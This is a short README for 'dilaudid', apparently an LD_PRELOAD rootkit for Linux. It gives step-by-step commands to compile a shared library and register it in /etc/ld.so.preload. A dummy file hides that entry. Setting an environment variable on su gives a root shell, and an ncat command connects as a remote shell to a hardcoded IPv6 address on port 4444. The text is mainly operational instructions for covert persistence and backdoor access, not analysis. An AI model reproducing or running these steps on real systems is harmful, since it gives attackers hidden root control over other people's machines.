# Dilaudid

Clone repository
```
git clone https://github.com/carls0n/dilaudid
```
Move to dilaudid directory
```
cd dilaudid
```

Next, compile dilaudid.
```
gcc -fPIC -shared -o dilaudid.so dilaudid.c -ldl
```
Move shared library
```
sudo cp dilaudid.so /usr/local/lib/
```
Next, install dilaudid
```
echo /usr/local/lib/dilaudid.so | sudo tee /etc/ld.so.preload
```
Finally, create blank dummy file (redirect cat /etc/ld.so.preload to /etc/ld.so.preload.dummy)
```
sudo touch /etc/ld.so.preload.dummy
```
To get a rootshell
```
rootshell=1 su
```
You can connect remotely now (ipv6 only)
```
ncat 2601:603:a7c:71c0:baba:19db:8655:2938 4444
```
Compile dilaudid-uninstall
```
gcc -static -o dilaudid-uninstall dilaudid-uninstall.c
```
Uninstall
```
sudo ./dilaudid-uninstall
```

